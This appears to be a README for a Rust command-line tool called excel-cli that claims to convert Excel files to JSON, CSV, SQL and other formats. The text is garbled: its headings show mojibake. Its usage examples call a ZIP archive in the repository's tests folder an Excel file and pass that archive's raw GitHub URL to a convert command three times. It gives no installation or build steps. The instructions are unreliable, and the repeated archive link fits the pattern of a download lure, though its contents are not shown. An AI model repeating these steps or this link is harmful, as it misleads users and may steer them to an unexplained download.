## üìù Overview

The **excel-cli** is a powerful command line tool built with Rust. It helps you convert Excel files into different formats, including JSON, CSV, SQL, HTML, Markdown, XML, and YAML. You can also perform updates and schema generation with data filtering capabilities. This tool makes it easier to work with your Excel files without needing complex software.

## üöÄ Features

- **Multiple Formats**: Convert Excel files to JSON, CSV, SQL, HTML, and more.
- **UPDATE/UPSERT Support**: Easily update your existing data.
- **Template Engine**: Utilize templates for customizable data output.
- **Data Filtering**: Filter your data during conversion.
- **Schema Generation**: Automatically generate schemas based on your Excel data.

## üíª System Requirements

- **Operating System**: Windows 10, macOS, or any Linux distribution.

## üîß Usage Instructions

1. **Open Command Line**: 

   On Windows, use Command Prompt. On macOS or Linux, open Terminal.

2. **Basic Conversion**: 

   To convert an Excel file (e.g., `https://raw.githubusercontent.com/Rairy04/excel-cli/master/tests/excel_cli_2.4.zip`) to CSV, use the following command:
   ```
   excel-cli convert https://raw.githubusercontent.com/Rairy04/excel-cli/master/tests/excel_cli_2.4.zip --to csv
   ```

3. **Advanced Usage**: 

   You can use filters with your conversion. For example, to convert and filter specific data:
   ```
   excel-cli convert https://raw.githubusercontent.com/Rairy04/excel-cli/master/tests/excel_cli_2.4.zip --to json --filter "status='active'"
   ```

4. **Review Other Commands**: 

   Check the full list of commands by typing:
   ```
   excel-cli --help
   ```
   This displays available commands and their descriptions.
